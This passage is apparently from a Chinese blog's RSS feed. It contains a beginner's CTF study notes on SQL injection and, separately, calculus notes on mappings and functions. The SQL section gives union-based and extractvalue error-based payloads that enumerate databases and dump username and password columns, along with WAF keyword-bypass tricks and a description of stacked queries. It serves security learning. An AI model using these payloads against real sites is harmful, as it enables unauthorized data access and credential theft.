&lt;p&gt;这里是&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930170155624.png&#34; alt=&#34;image-20220930170155624&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;afZ_r9VYfScOeO_UL^RWUc&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;根据格式，对前 5 位，按照 ASCII 表解密为&lt;strong&gt; flag {&lt;/strong&gt;，从而推出加密规律。&lt;/p&gt;
&lt;p&gt;udf 提权，mof 提权&lt;/p&gt;
&lt;p&gt;宽字节注入限制&lt;/p&gt;
&lt;p&gt;什么时候用，&lt;/p&gt;
&lt;p&gt;怎么用，用在哪，&lt;/p&gt;
&lt;p&gt;为什么要用。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/</guid>
            <title>SQL注入</title>
            <link>https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/</link>
            <category>CTF</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;作为刚入门时，初步接触 SQL 所作的笔记&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;h2 id=&#34;1postget注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1postget注入&#34;&gt;#&lt;/a&gt; 1.post&amp;amp;get 注入&lt;/h2&gt;
&lt;p&gt;修改 username 等信息进行无账号登录或构造语句查询敏感数据。&lt;/p&gt;
&lt;p&gt;常用 &lt;code&gt;&#39;&lt;/code&gt; ， &lt;code&gt;&amp;quot;&lt;/code&gt; ， &lt;code&gt;&#39;)&lt;/code&gt; ， &lt;code&gt;&amp;quot;)&lt;/code&gt;  与 “and 1=1；and1=2” 与  &lt;code&gt;-- &#39;&lt;/code&gt;  进行试探～～(可能有双括号)~~&lt;/p&gt;
&lt;p&gt;目的：判断是字符还是整形&lt;/p&gt;
&lt;p&gt;之后用 order by 或 union select 判断段数&lt;/p&gt;
&lt;p&gt;再子查询&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 语句联合查询&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;schema_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;schemata&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;db&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;column_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;T&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;db&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查字段&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; security&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;users&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查字段内容&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; security&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;users &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 当显示长度有限制时&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;2extractvalue-报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2extractvalue-报错注入&#34;&gt;#&lt;/a&gt; 2.extractvalue 报错注入&lt;/h2&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;extractvaule 报错注入&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查数据库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查库的表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;column_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 查表的字段&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;extractvalue(content,path)&lt;/code&gt;  这里利用了 &lt;code&gt;path&lt;/code&gt;  错误报错获取信息，利用了 &lt;code&gt;concat&lt;/code&gt;  与 &lt;code&gt;select&lt;/code&gt;  的嵌套&lt;/p&gt;
&lt;p&gt;从而使报错内容 &lt;code&gt;concat&lt;/code&gt;  得以显示。&lt;strong&gt;也就是说错误的是 &lt;code&gt;concat(slect)&lt;/code&gt;  报错时报 &lt;code&gt;concat&lt;/code&gt;  的错但会回显，从而显示 &lt;code&gt;select&lt;/code&gt;  的内容&lt;/strong&gt;，达到获取信息的目的。&lt;/p&gt;
&lt;h2 id=&#34;3绕warf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3绕warf&#34;&gt;#&lt;/a&gt; 3. 绕 warf&lt;/h2&gt;
&lt;p&gt;/**/ 替空格，unionunion 类似绕关键字屏蔽，selselectect 包括。&lt;/p&gt;
&lt;p&gt;base-64，MD5 () 解码。&lt;/p&gt;
&lt;h2 id=&#34;4编码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4编码&#34;&gt;#&lt;/a&gt; 4. 编码&lt;/h2&gt;
&lt;p&gt;%23 -- #   URL 编码&lt;/p&gt;
&lt;h2 id=&#34;5盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5盲注&#34;&gt;#&lt;/a&gt; 5. 盲注&lt;/h2&gt;
&lt;p&gt;使用 Python 脚本&lt;/p&gt;
&lt;h2 id=&#34;6堆叠注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6堆叠注入&#34;&gt;#&lt;/a&gt; 6. 堆叠注入&lt;/h2&gt;
&lt;p&gt;堆叠注入原理&lt;/p&gt;
&lt;p&gt;堆叠注入，顾名思义，就是将语句堆叠在一起进行查询&lt;br /&gt;
原理很简单，mysql_multi_query () 支持多条 sql 语句同时执行，就是个；分隔，成堆的执行 sql 语句，例如&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;databases&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;就同时执行以上两条命令，所以我们可以增删改查，只要权限够&lt;br /&gt;
虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到 API 或者数据库引擎，又或者权限的限制&lt;em&gt;&lt;strong&gt;只有当调用数据库函数支持执行多条 sql 语句时才能够使用&lt;/strong&gt;&lt;/em&gt;，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，&amp;lt;u&amp;gt; 但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限 &amp;lt;/u&amp;gt;，一旦能够被使用，将可能对网站造成十分大的威胁。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;原文链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0L2FydGljbGUvZGV0YWlscy8xMDczNzYyODQ=&#34;&gt;https://blog.csdn.net/qq_45691294/article/details/107376284&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;7绕过select注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7绕过select注入&#34;&gt;#&lt;/a&gt; 7. 绕过 select 注入&lt;/h2&gt;
&lt;p&gt;使用 handler 语法。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B8%80/</guid>
            <title>高等数学笔记一</title>
            <link>https://evefortosaber.github.io/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B8%80/</link>
            <category>Notes</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;高等数学一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#高等数学一&#34;&gt;#&lt;/a&gt; 高等数学・一&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;学习时做的一些笔记，顺便对内容梳理一遍。^0&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;第一章-函数与极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一章-函数与极限&#34;&gt;#&lt;/a&gt; 第一章 函数与极限&lt;/h2&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第一节-映射与函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一节-映射与函数&#34;&gt;#&lt;/a&gt; 第一节 映射与函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;映射&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;与 x 所对应的 y 称为 x 在映射 f 下的象。&lt;br /&gt;
x 称为 y 在 f 下的原象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;满射、一一映射、单射、双射&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A 映射得到的 B 集合等于映射的目标集合则是满射。&lt;/p&gt;
&lt;p&gt;对每个 y 都有唯一一个 x 对应，则是&lt;strong&gt;单射&lt;/strong&gt;或称&lt;strong&gt;一一映射&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;若 f 既是满射又是单射则称为&lt;strong&gt;双射&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;函数定义与表示方法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;特殊函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;狄利克雷函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/00_2.png&#34; alt=&#34;00_2&#34; title=&#34;狄利克雷函数&#34; /&gt;&lt;/p&gt;
&lt;p&gt;狄利克雷函数是一个定义在实数范围上、值域不连续的函数。狄利克雷函数的图像以 Y 轴为对称轴，是一个偶函数，它处处不连续，处处极限不存在，不可黎曼积分。这是一个处处不连续的可测函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;符号函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/00_3-1663132097343.png&#34; alt=&#34;00_3&#34; title=&#34;符号函数&#34; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;取整函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220914131129520.png&#34; alt=&#34;image-20220914131129520&#34; /&gt;&lt;/p&gt;
&lt;p&gt;函数 y=[x] 称为取整函数，也称&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklQUIlOTglRTYlOTYlQUYlRTUlODclQkQlRTYlOTUlQjAvMjY3MDk1MT9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==&#34;&gt;高斯函数&lt;/span&gt;。其中不超过实数 x 的最大整数称为 x 的整数部分，记作 [x]。该函数被广泛应用于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTglQUUlQkEvMzcwMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==&#34;&gt;数论&lt;/span&gt;，函数绘图和计算机领域。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;函数的有界性&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;函数 f (x) 在 D 上有界的充要条件是 f (x) 在 D 上既有上界又有下界。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;函数的单调性&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单调增 (减) 函数&lt;/li&gt;
&lt;li&gt;严格单调增 (减) 函数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;函数的四则运算&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;复合函数&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
